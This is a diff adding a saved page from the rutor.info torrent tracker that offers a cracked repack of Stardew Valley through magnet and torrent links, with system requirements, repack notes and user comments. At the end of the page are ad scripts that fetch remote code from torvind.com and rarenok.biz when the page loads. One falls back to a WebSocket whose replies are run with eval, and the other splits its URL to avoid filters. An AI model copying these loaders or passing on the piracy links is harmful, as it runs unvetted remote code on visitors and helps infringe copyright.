@@ -1,0 +1,362 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: Stardew Valley [v 1.3.9] (2016) PC | RePack от Pioneer</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Stardew Valley [v 1.3.9] (2016) PC | RePack от Pioneer</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:7e8a6566f48224f45ed69a53ddb783e6a649f9ba&amp;dn=rutor.info_Stardew+Valley+%5Bv+1.3.9%5D+%282016%29+PC+%7C+RePack+%D0%BE%D1%82+Pioneer&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=630507"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/630507"><img src="http://s.rutor.info/t/down.png"> Скачать Stardew_Valley_v1.3.9_by_Pioneer.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><img src="http://a.radikal.ru/a05/1712/21/552316b0ec37.png" style="float:right;" /><center><b><font size="5"><span style="color:#000033;">Stardew Valley - 32bit</span></b></font></center><br />
+<hr /><img src="https://c.radikal.ru/c14/1803/5b/dc27e4937f3f.jpg" /><hr /><b>Год выхода:</b> 2016<br />
+<b>Жанр:</b>  <a href="/tag/8/Simulation" target="_blank">Simulation</a>, <a href="/tag/8/RPG" target="_blank">RPG</a>, <a href="/tag/8/Managerial" target="_blank">Managerial</a><br />
+<b>Разработчик/Издательство:</b> ConcernedApe / Chucklefish<br />
+<b>Язык интерфейса:</b> <img src="http://s013.radikal.ru/i322/1703/47/8071907ba773.png" /> Русский, Английский, MULTi7<br />
+<b>Язык озвучки:</b> <img src="http://s020.radikal.ru/i709/1703/27/4a73b7941c07.png" /> Английский<br />
+<b>Тип издания:</b> Repack<br />
+<b>Мультиплеер</b> Доступен<br />
+<b>Таблетка:</b> Присутствует (встроена)<br />
+<hr /><img src="https://d.radikal.ru/d24/1803/44/60c94ccc0d12.jpg" /><hr /><b><span style="color:green;">☑</span> Операционная система:</b> Windows Vista, 7, 8, 10<br />
+<b><span style="color:green;">☑</span> Процессор:</b> 2 Ghz<br />
+<b><span style="color:green;">☑</span> Оперативная память:</b> 2 GB ОЗУ<br />
+<b><span style="color:green;">☑</span> Графический ускоритель:</b> 256 mb video memory, shader model 3.0+<br />
+<b><span style="color:green;">☑</span> Свободное место на HDD:</b> 850 MB<br />
+<hr /><img src="https://a.radikal.ru/a29/1803/90/fac9bbd87489.jpg" /><hr />Дедушка оставил вам в наследство старую ферму в Стардью-Вэлли. У вас в кармане пара монет и простые инструменты – все, что нужно для начала новой жизни. Сможете ли вы прокормиться земледелием и превратить эти заросли в цветущий сад? Это будет нелегко, ведь былой уклад жизни исчезает под натиском появившейся в городе корпорации. Местный общественный центр, где когда-то кипела жизнь, заброшен. Но шансов еще предостаточно! Немного усердия, и вы сможете возродить былое величие Стардью-Вэлли!<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Особенности игры:</div><div class="hidebody"></div><textarea class="hidearea">▪ Превратите поросшие бурьяном поля в опрятную ферму! Выращивайте скот и посевы, посадите фруктовый сад, возводите нужные в хозяйстве сооружения! Создайте ферму своей мечты – места вам хватит.<br />
+▪ Со временем повышайте свои навыки. На пути от неопытного новичка до матерого фермера вам предстоит продвинуться в пяти различных сферах: сельское хозяйство, горное дело, борьба, рыболовство и поиск пропитания. Вы познакомитесь с новыми кулинарными рецептами и рукодельными приемами, обнаружите новые локации и выберете свою специализацию из множества профессий.<br />
+▪ Станьте своим. В Стардью-Вэлли более 30 уникальных жителей, и вы без труда найдете себе друзей! У каждого из них свой распорядок дня, дата рождения, мини-видеоролики и набор реплик на целый год. Наладив с ними отношения, вы сможете помочь им с личными неурядицами и узнать их секреты! Примите участие в таких сезонных праздниках, как гавайская вечеринка, лабиринт страха и День Зимней звезды.</textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))"> Особенности Репака</div><div class="hidebody"></div><textarea class="hidearea"><br />
+!! За основу взят Лицензионный контент <br />
+<br />
+- Ничего не вырезано.<br />
+- Ничего не перекодировано.<br />
+- Архивы игры не затронуты.<br />
+- Версия игры: 1.3.9.<br />
+- Время установки: ~ 2 минуты.<br />
+- Возможность сетевой игры.<br />
+- Запуск игры ярлыком на рабочем столе</textarea></div><br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Как играть по сети:</div><div class="hidebody"></div><textarea class="hidearea">2.1) Открываем ДЛЯ LAN игры: Любой эмулятор локально сети / настоящую локальную сеть. <br />
+2.2) Запускаем игру файлом Stardew Valley.exe. <br />
+<br />
+<fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br /><br />
+Создание сервера к Игре:<br />
+  3.1) Совместная Игра =&gt; Создать игру =&gt; Создать новую ферму =&gt; Тут указываем всё что нас устроит и жмём OK.<br />
+<br />
+Подключение к серверам:<br />
+  4.1) Совместная Игра =&gt; Входим на доступный сервер либо указываем IP нажав на кнопку &quot;Зайти в игру по LAN&quot;.<br />
+</fieldset></textarea></div><br />
+<center><a href="https://c.radikal.ru/c17/1805/e0/fe7a7d496561.jpg" target="_blank"><img src="https://c.radikal.ru/c17/1805/e0/fe7a7d496561t.jpg" /></a> <a href="https://b.radikal.ru/b02/1805/ef/e40d30667812.jpg" target="_blank"><img src="https://b.radikal.ru/b02/1805/ef/e40d30667812t.jpg" /></a> <a href="https://d.radikal.ru/d02/1805/1d/dc8441372c87.jpg" target="_blank"><img src="https://d.radikal.ru/d02/1805/1d/dc8441372c87t.jpg" /></a> <br />
+P.S. <u>Русский язык</u> включается в главном меню (Жмём на облако Справа Внизу).<br />
+08.05.2018 - Торрент обновлён, добавлена инструкция по включению русского языка и необходимый софт.</center></td></tr>
+<tr><td class="header">Залил</td><td><b><a href="/browse/0/0/1285823/0" target="_blank">PioneerJeka</a></b></td></tr>
+<tr><td class="header">Оценка</td><td>10 из 10 (1 голосов, самая низкая оценка - 10, самая высокая - 10)</td></tr>
+<tr><td class="header">Категория</td><td><a href="/games" target="_blank">Игры </a></td></tr>
+<tr><td class="header">Раздают</td><td>22</td></tr>
+<tr><td class="header">Качают</td><td>3</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 8:19:06 (17 минут назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 18:21:18  (14 часа назад)</td></tr>
+<tr><td class="header">Размер</td><td>352.73&nbsp;MB  (369864833 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 630507);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>30&nbsp;Дек&nbsp;17</td><td ><a class="downgif" href="http://d.rutor.info/download/604857"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:4be07800c5357a8124a05128a903fbbffac2de44&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/604857/stardew-valley-v-1.2.33-2016-pc-repack-ot-qoob">Stardew Valley [v 1.2.33] (2016) PC | RePack от qoob </a></td> <td align="right">3<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">266.47&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;41</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>12&nbsp;Июл&nbsp;17</td><td ><a class="downgif" href="http://d.rutor.info/download/575820"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:e8a20eb9a85eb7aa8b3738e5ee0d22e9b55304d5&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/575820/stardew-valley-v-1.2.33-2016-pc-licenzija">Stardew Valley [v 1.2.33] (2016) PC | Лицензия </a></td> <td align="right">2<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">379.76&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;36</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/8/0/0/Stardew Valley" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/630507.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (3)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=630507">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(630507);">Промодерировать раздачу</span> | <span onclick="confirm_delete(630507);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/630507">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"><tr class="c_h"><td><b>PioneerJeka</b></td> <td>08-05-2018 19:55:14 (13 часа назад)</td> <td></td> <td align="right"><span id="c_3199507"></span><script type="text/javascript">cOptions(1285823,3199507);</script></td></tr><tr><td class="c_t" colspan=4><b>MiraakV</b>, по мере выхода обновлений и конечно же это будет быстрее, если люди будут сообщать о таковых.)</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>MiraakV</b></td> <td>08-05-2018 19:00:58 (14 часа назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_3199476"></span><script type="text/javascript">cOptions(1545709,3199476);</script></td></tr><tr><td class="c_t" colspan=4>Работает всё отлично, в том числе и мультиплеер. Надеюсь обновляться будет стабильно.</td></tr><tr><td colspan="4">&nbsp;</td></tr></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
